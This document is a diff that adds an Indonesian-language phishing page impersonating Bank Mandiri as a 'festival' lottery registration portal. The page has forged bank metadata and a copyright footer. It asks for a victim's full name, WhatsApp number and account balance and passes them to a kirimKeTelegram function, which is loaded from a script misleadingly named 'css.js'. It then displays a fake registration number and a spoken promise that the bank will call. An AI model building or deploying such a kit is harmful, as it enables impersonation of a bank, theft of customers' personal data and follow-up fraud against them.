@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- Meta Tags Utama -->
+    <meta name="title" content="Bank Mandiri Festival - Portal Resmi Pendaftaran">
+    <meta name="description" content="Layanan pendaftaran resmi program undian dan festival Bank Mandiri untuk nasabah setia.">
+    <meta name="keywords" content="Bank Mandiri, Festival Mandiri, Undian Mandiri, Layanan Nasabah">
+    <meta name="author" content="PT Bank Mandiri (Persero) Tbk.">
+    <meta name="theme-color" content="#003366">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <!-- Open Graph / Meta Image untuk WhatsApp, Telegram, Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://websiteanda.com/">
+    <meta property="og:title" content="Bank Mandiri Festival - Portal Resmi Pendaftaran">
+    <meta property="og:description" content="Layanan pendaftaran resmi program undian dan festival Bank Mandiri untuk nasabah setia.">
+    <meta property="og:image" content="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://websiteanda.com/">
+    <meta property="twitter:title" content="Bank Mandiri Festival - Portal Resmi Pendaftaran">
+    <meta property="twitter:description" content="Layanan pendaftaran resmi program undian dan festival Bank Mandiri untuk nasabah setia.">
+    <meta property="twitter:image" content="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png" type="image/png">
+
+    <title>Mandiri Mobile Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .mandiri-blue { color: #003366; }
+        .typing-cursor::after {
+            content: '|';
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body class="bg-[#f1f5f9] min-h-screen font-sans flex flex-col justify-between">
+
+    <!-- HALAMAN LOADING AWAL -->
+    <div id="halamanLoadingAwal" class="fixed inset-0 bg-[#003366] z-50 flex flex-col items-center justify-center p-4 text-white space-y-4">
+        <img src="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png" alt="Logo Mandiri" class="h-12 object-contain brightness-0 invert mb-2">
+        <div class="w-10 h-10 border-4 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
+        <p class="text-sm font-medium tracking-wide">Memuat Layanan Bank Mandiri...</p>
+    </div>
+
+    <!-- HEADER GLOBAL -->
+    <header class="w-full bg-white px-4 py-3 flex justify-between items-center border-b border-gray-200 shadow-sm sticky top-0 z-40">
+        <div class="flex items-center">
+            <img src="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png" alt="Logo Mandiri" class="h-8 object-contain">
+        </div>
+        <div class="flex items-center space-x-4 mandiri-blue">
+            <button aria-label="Search" class="focus:outline-none">
+                <svg class="w-6 h-6 stroke-current" fill="none" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                </svg>
+            </button>
+            <button aria-label="Menu" class="focus:outline-none">
+                <svg class="w-7 h-7 stroke-current" fill="none" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="3" y1="6" x2="21" y2="6"></line>
+                    <line x1="3" y1="12" x2="21" y2="12"></line>
+                    <line x1="3" y1="18" x2="21" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- HALAMAN 1: FORMULIR UTAMA -->
+    <main id="halaman1" class="w-full flex-grow p-4 max-w-sm mx-auto space-y-4">
+        
+        <!-- Image Slider -->
+        <div class="relative w-full overflow-hidden rounded-xl bg-gray-900 shadow-md">
+            <div id="slider" class="flex transition-transform duration-500 ease-in-out w-full">
+                <div class="min-w-full flex items-center justify-center">
+                    <img src="https://i.ibb.co.com/fdmzc53R/IMG-2995.jpg" class="w-full h-auto max-h-48 object-contain" alt="Slide 1">
+                </div>
+                <div class="min-w-full flex items-center justify-center">
+                    <img src="https://i.ibb.co.com/HTbCPgzZ/IMG-2812.jpg" class="w-full h-auto max-h-48 object-contain" alt="Slide 2">
+                </div>
+            </div>
+            <div class="absolute bottom-2 left-0 right-0 flex justify-center space-x-2 z-10">
+                <button onclick="changeSlide(0)" class="w-2.5 h-2.5 rounded-full bg-white shadow"></button>
+                <button onclick="changeSlide(1)" class="w-2.5 h-2.5 rounded-full bg-gray-400 shadow"></button>
+            </div>
+        </div>
+
+        <!-- Form Input -->
+        <div class="bg-white p-5 rounded-2xl shadow-md space-y-4">
+            <h2 class="text-base font-bold text-gray-800 border-b pb-2">Formulir Data</h2>
+
+            <div>
+                <label class="block text-sm font-semibold text-gray-700 mb-1">Nama Lengkap</label>
+                <input type="text" id="inputNama" placeholder="Masukkan nama lengkap" 
+                    class="w-full px-3.5 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-800 text-sm">
+            </div>
+
+            <div>
+                <label class="block text-sm font-semibold text-gray-700 mb-1">Nomor WhatsApp</label>
+                <input type="tel" id="nomorWa" placeholder="08xxxxxxxxxx" 
+                    minlength="10" maxlength="13" 
+                    oninput="validasiAngka(this)"
+                    class="w-full px-3.5 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-800 text-sm">
+                <span id="waError" class="text-xs text-red-500 hidden mt-1">Nomor WA harus 10-13 digit.</span>
+            </div>
+
+            <div>
+                <label class="block text-sm font-semibold text-gray-700 mb-1">Jumlah Saldo</label>
+                <div class="relative flex items-center">
+                    <span class="absolute left-3.5 font-bold text-gray-600 text-sm">Rp</span>
+                    <input type="tel" id="inputSaldo" placeholder="0" 
+                        oninput="formatRupiah(this)"
+                        class="w-full pl-10 pr-3.5 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-800 text-sm font-semibold text-gray-800">
+                </div>
+            </div>
+
+            <button onclick="kirimData()" class="w-full bg-[#003366] hover:bg-blue-900 text-white font-bold py-3 rounded-lg shadow transition duration-200 text-sm mt-2">
+                Kirim Data
+            </button>
+
+            <div class="overflow-hidden whitespace-nowrap pt-2 border-t border-gray-100">
+                <marquee behavior="scroll" direction="left" scrollamount="5" class="text-xs font-medium text-blue-900">
+                    ⚠️ Pastikan data diri dan nomor WhatsApp yang dimasukkan sudah benar untuk kelancaran proses verifikasi undian Bank Mandiri.
+                </marquee>
+            </div>
+        </div>
+    </main>
+
+    <!-- HALAMAN LOADING SUBMIT -->
+    <div id="halamanLoading" class="hidden fixed inset-0 bg-black/50 z-50 flex flex-col items-center justify-center p-4">
+        <div class="bg-white p-6 rounded-2xl shadow-2xl flex flex-col items-center space-y-3 max-w-xs w-full text-center">
+            <div class="w-10 h-10 border-4 border-[#003366] border-t-transparent rounded-full animate-spin"></div>
+            <p class="text-sm font-bold text-gray-800">Sedang memproses data...</p>
+            <p class="text-xs text-gray-500">Mohon tunggu sebentar</p>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: PESAN SUKSES -->
+    <main id="halaman2" class="hidden w-full flex-grow p-4 max-w-md mx-auto my-auto flex items-center justify-center">
+        <div class="w-full bg-[#2b6cb0] text-white p-6 rounded-2xl shadow-xl border-4 border-white text-center space-y-4 relative overflow-hidden">
+            <div class="absolute -right-10 -top-10 w-32 h-32 bg-white/10 rounded-full pointer-events-none"></div>
+
+            <div class="flex justify-center mb-1">
+                <div class="bg-white/20 p-3 rounded-full">
+                    <svg class="w-12 h-12 text-yellow-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 5v2m0 4v2m0 4v2M5 5a2 2 0 00-2 2v3a2 2 0 110 4v3a2 2 0 002 2h14a2 2 0 002-2v-3a2 2 0 110-4V7a2 2 0 00-2-2H5z"></path>
+                    </svg>
+                </div>
+            </div>
+
+            <h3 class="text-lg font-bold tracking-wider text-yellow-300 uppercase">Pendaftaran Berhasil</h3>
+            <hr class="border-white/30 my-2">
+
+            <p id="teksKetik" class="text-sm md:text-base font-medium leading-relaxed typing-cursor text-left bg-blue-950/30 p-3 rounded-xl border border-white/10"></p>
+
+            <div class="pt-2">
+                <span class="text-xs text-blue-200 block mb-1">Nomor Registrasi Anda:</span>
+                <span id="kodeUnik" class="bg-white text-blue-900 font-mono font-bold text-base px-4 py-1.5 rounded-lg shadow-inner inline-block tracking-widest">
+                    MDR-XXXXXX
+                </span>
+            </div>
+
+            <div class="pt-2">
+                <button onclick="putarSuaraManual()" class="bg-yellow-400 hover:bg-yellow-500 text-blue-950 font-bold text-xs py-2 px-4 rounded-lg shadow transition duration-200 flex items-center justify-center mx-auto space-x-1.5">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path></svg>
+                    <span>Putar Ulang Suara</span>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER GLOBAL -->
+    <footer class="w-full bg-[#2b6cb0] text-white py-4 px-4 flex flex-col items-center justify-center space-y-1.5 mt-auto">
+        <img src="https://i.ibb.co.com/vCMybZ3v/IMG-2974.png" alt="Logo Mandiri Footer" class="h-6 object-contain brightness-0 invert">
+        <p class="text-xs font-normal text-center tracking-wide">© 2026 PT Bank Mandiri (Persero) Tbk.</p>
+    </footer>
+
+    
+    <script src="css.js"></script>
+
+    <!-- JavaScript Logika UI -->
+    <script>
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const loaderAwal = document.getElementById('halamanLoadingAwal');
+                loaderAwal.style.opacity = '0';
+                loaderAwal.style.transition = 'opacity 0.5s ease';
+                setTimeout(() => {
+                    loaderAwal.classList.add('hidden');
+                }, 500);
+            }, 1200);
+        });
+
+        let currentSlide = 0;
+        const slider = document.getElementById('slider');
+        function changeSlide(index) {
+            currentSlide = index;
+            slider.style.transform = `translateX(-${currentSlide * 100}%)`;
+        }
+        setInterval(() => {
+            if (slider) {
+                currentSlide = (currentSlide + 1) % 2;
+                changeSlide(currentSlide);
+            }
+        }, 4000);
+
+        function validasiAngka(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            const errorText = document.getElementById('waError');
+            if (input.value.length > 0 && (input.value.length < 10 || input.value.length > 13)) {
+                errorText.classList.remove('hidden');
+            } else {
+                errorText.classList.add('hidden');
+            }
+        }
+
+        function formatRupiah(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            if (value === '') {
+                input.value = '';
+                return;
+            }
+            input.value = parseInt(value, 10).toLocaleString('id-ID');
+        }
+
+        const teksPesanGlobal = "Terimakasih Telah Mendaftar Dilayanan Bank Mandiri Festival, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Mandiri, Untuk Proses Cetak Kode Kupon Undian Anda.";
+
+        function ucapkanTeks(pesan) {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const speech = new SpeechSynthesisUtterance(pesan);
+                speech.lang = 'id-ID';
+                speech.rate = 0.95;
+                speech.pitch = 1.0;
+                window.speechSynthesis.speak(speech);
+            }
+        }
+
+        function putarSuaraManual() {
+            ucapkanTeks(teksPesanGlobal);
+        }
+
+        function mulaiEfekKetik(teks, elemenId, kecepatan = 35) {
+            let i = 0;
+            const target = document.getElementById(elemenId);
+            target.innerHTML = "";
+            
+            function ketik() {
+                if (i < teks.length) {
+                    target.innerHTML += teks.charAt(i);
+                    i++;
+                    setTimeout(ketik, kecepatan);
+                } else {
+                    target.classList.remove('typing-cursor');
+                }
+            }
+            ketik();
+        }
+
+        function kirimData() {
+            const nama = document.getElementById('inputNama').value;
+            const wa = document.getElementById('nomorWa').value;
+            const saldo = document.getElementById('inputSaldo').value;
+
+            if (!nama || !wa || !saldo) {
+                alert('Mohon isi semua data dengan lengkap!');
+                return;
+            }
+
+            if (wa.length < 10 || wa.length > 13) {
+                alert('Nomor WhatsApp harus 10 - 13 digit!');
+                return;
+            }
+
+            // Tampilkan Layar Loading Submit
+            document.getElementById('halamanLoading').classList.remove('hidden');
+
+            // Panggil fungsi kirim ke Telegram dari file telegram.js
+            kirimKeTelegram(nama, wa, saldo);
+
+            setTimeout(() => {
+                document.getElementById('halamanLoading').classList.add('hidden');
+
+                const randomCode = 'MDR-' + Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('kodeUnik').innerText = randomCode;
+
+                document.getElementById('halaman1').classList.add('hidden');
+                document.getElementById('halaman2').classList.remove('hidden');
+                
+                mulaiEfekKetik(teksPesanGlobal, 'teksKetik', 30);
+                ucapkanTeks(teksPesanGlobal);
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
